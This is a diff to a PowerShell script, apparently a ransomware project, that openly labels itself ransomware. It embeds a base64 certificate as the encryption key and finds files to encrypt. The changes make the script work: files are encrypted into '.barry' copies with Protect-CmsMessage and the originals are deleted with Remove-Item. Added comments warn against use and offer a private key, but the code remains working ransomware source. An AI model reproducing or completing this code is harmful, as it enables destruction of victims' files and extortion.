@@ -1,4 +1,5 @@
-﻿#RANSOMWARE TIME!!!
+#Don't Use This. You will go to Prison....
+#I do have private key saved locally if you need it.
 
 #Encryption Key
 $certificate = [Convert]::FromBase64String("MIIH+jCCBeKgAwIBAgITfgAAAAaY/KsVSIby2AAAAAAABjANBgkqhkiG9w0BAQsFADBFMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFzAVBgoJkiaJk/IsZAEZFgd0ZXN0aW5nMRMwEQYDVQQDEwpUZXN0aW5nLUNBMB4XDTIyMDcx
@@ -17,7 +18,7 @@ bkF1dGhvcml0eTBTBgNVHREETDBKoCsGCisGAQQBgjcUAgOgHQwbQWRtaW5pc3RyYXRvckB0ZXN0aW5n
 FGViZeROfES2XXVKgOFwkNtvx2ADJQofNCaewYX3dYrx8AJ7/0zbKIVtXdVi1Au4XRfH1DyfhaMO8uInl26iwlcS/H291T20DJ3eruL7xKN0AI9V9HAG8f4mMfq4AwdFn+EKlYt4KGqQPB7ArfuIdQuSo64BW5Q0d9CXeQJ2PKGX
 L14ptSrlrF25FvE//cV/5qPHltYxcHQYDqBTSqIHvQ74BmoaYdZawUO15eHsgxkKOrLQO54j+/iiuQ09Z9/A1J9741P0nLhI+D/qHM+otfz+6j6l286ihThtnw26mDhfinOXpipuTlXmvlNnh/rn1ntWH+g7vqKghItLOy2qDM3e
 bHLlhbgrrWadmhG51mO3TkITHvkC5bsNxnL8GwYYs2VrUpRWvb4WLE93W7ZTOfFFOmlBkapqBt9kVLgyzYiGLIrDEFVvImb0hJj3JAiImRXibEq1mxXKIwMZQO9oAeByq8JLJGXcAPpEl9BMXPzh")
-[X509Certificate] $cert2 = $certificate 
+[System.Security.Cryptography.X509Certificates.X509Certificate2] $cert = $certificate 
 
 function Find-Files{
     $files = @()
@@ -48,8 +49,8 @@ function Encrypt-Files{
         Write-Host 'Encrypting $file'
         $path = $file.FullName
         $newfile = $path+'.barry'
-        $newcert = 
-        Protect-CmsMessage -To $newcert -Path $path -OutFile $newfile
+        Protect-CmsMessage -To $cert -Path $path -OutFile $newfile
+        Remove-Item -Path $path
         
     }
 }
